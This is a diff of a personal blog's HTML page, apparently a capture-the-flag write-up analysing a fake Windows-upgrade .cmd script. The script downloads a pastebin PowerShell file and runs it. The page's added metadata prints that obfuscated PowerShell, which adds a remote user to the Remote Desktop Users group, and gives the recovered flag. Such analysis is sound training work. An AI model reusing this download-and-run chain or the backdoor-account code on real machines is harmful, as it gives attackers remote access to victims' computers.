@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Upgrading Windows - Writeup | Journal of Connar</title>
 <meta name="keywords" content="">
 <meta name="description" content="In this test, we are given a &ldquo;.cmd&rdquo; script whose purpose is to upgrade the user&rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&rsquo;s analyze the file to see what we can find.
@@ -12,16 +12,16 @@
 
 We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/ctfwriteups/upgradingwindows/">
+<link rel="canonical" href="https://connar.github.io/ctfwriteups/upgradingwindows/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/ctfwriteups/upgradingwindows/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/ctfwriteups/upgradingwindows/">
 <noscript>
     <style>
         #theme-toggle,
@@ -58,7 +58,77 @@ We observe that indeed the script contains a portion of code that attempts to up
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="Upgrading Windows - Writeup" />
+<meta property="og:description" content="In this test, we are given a &ldquo;.cmd&rdquo; script whose purpose is to upgrade the user&rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&rsquo;s analyze the file to see what we can find.
+
+
+We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/ctfwriteups/upgradingwindows/" /><meta property="article:section" content="ctfwriteups" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Upgrading Windows - Writeup"/>
+<meta name="twitter:description" content="In this test, we are given a &ldquo;.cmd&rdquo; script whose purpose is to upgrade the user&rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&rsquo;s analyze the file to see what we can find.
+
+
+We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Ctfwriteups",
+      "item": "https://connar.github.io/ctfwriteups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Upgrading Windows - Writeup",
+      "item": "https://connar.github.io/ctfwriteups/upgradingwindows/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Upgrading Windows - Writeup",
+  "name": "Upgrading Windows - Writeup",
+  "description": "In this test, we are given a \u0026ldquo;.cmd\u0026rdquo; script whose purpose is to upgrade the user\u0026rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let\u0026rsquo;s analyze the file to see what we can find.\nWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "In this test, we are given a “.cmd” script whose purpose is to upgrade the user’s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let’s analyze the file to see what we can find.\nWe observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:\nIt downloads content from the URL https://pastebin.com/raw/XMRy2Kp4 and saves it into a PowerShell file named safe.ps1. It then executes the newly created file. Therefore, we can easily assume that the next step is to analyze what exists at the URL from the link we discovered earlier. Visiting the link, we find the following PowerShell code:\n$computername = \"DESKTOP-5570\" Invoke-Command -ComputerName $computername -ScriptBlock { $computer = $env:COMPUTERNAME $domain = \"105.10.10.34\" $user = ((\"{22}{24}{8}{28}{33}{19}{6}{30}{20}{4}{15}{26}{5}{32}{18}{13}{12}{10}{3}{17}{9}{2}{1}{16}{23}{7}{27}{31}{29}{14}{21}{0}{11}{25}\" -f '3','1n','3h','urc+','urc','c+urc3ll3d_7u','5_','u','FL','b','y','6s','3r','my5urc+urc7','rc1urc+urcp7}ur','v','d_7h15','urc_','3_','rc+urcngra7','0u_unr4urc+','c)','(ur','_','c',' iEx','ur','rc+urc5uurc','AG{C','crurc+u','Y','+urc5_5','rc+urch','0u')).REplAcE('urc',[striNg][ChAR]39).REplAcE(([ChAR]51+[ChAR]54+[ChAR]115),'|')|\u0026( $VERboSePrEfeRENCE.ToSTrinG()[1,3]+'X'-JoiN'') $group = [ADSI]\"WinNT://$computer/Remote Desktop Users,group\" $group.psbase.Invoke(\"add\",([ADSI]\"WinNT://$domain/$user\").Path) } This code appears to be attempting to add a remote user to the victim’s computer. The unusual part is the username it is trying to add, as it is not straightforward but is built using obfuscation techniques.\nWhile recovering the name may seem difficult, it is actually quite straightforward. All we need to do is copy that specific line and execute it inside a PowerShell terminal, as at the end of the command, it joins the total string, printing it to the screen.\nAnd like this, we get the flag: FLAG{C0ngra75_Y0u_unr4v3ll3d_7h3_my573ry_b3h1nd_7h15_5u5_5cr1p7}\n",
+  "wordCount" : "268",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/ctfwriteups/upgradingwindows/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -76,7 +146,7 @@ We observe that indeed the script contains a portion of code that attempts to up
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -102,42 +172,42 @@ We observe that indeed the script contains a portion of code that attempts to up
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -148,7 +218,7 @@ We observe that indeed the script contains a portion of code that attempts to up
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/ctfwriteups/">Ctfwriteups</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/ctfwriteups/">Ctfwriteups</a></div>
     <h1 class="post-title entry-hint-parent">
       Upgrading Windows - Writeup
     </h1>
@@ -187,12 +257,12 @@ We observe that indeed the script contains a portion of code that attempts to up
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/ctfwriteups/sysupdate/">
+  <a class="prev" href="https://connar.github.io/ctfwriteups/sysupdate/">
     <span class="title">« Prev</span>
     <br>
     <span>sysupdate - Writeup</span>
   </a>
-  <a class="next" href="http://localhost:1313/ctfwriteups/weaklegacy/">
+  <a class="next" href="https://connar.github.io/ctfwriteups/weaklegacy/">
     <span class="title">Next »</span>
     <br>
     <span>Weak Legacy - Writeup</span>
@@ -204,7 +274,7 @@ We observe that indeed the script contains a portion of code that attempts to up
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
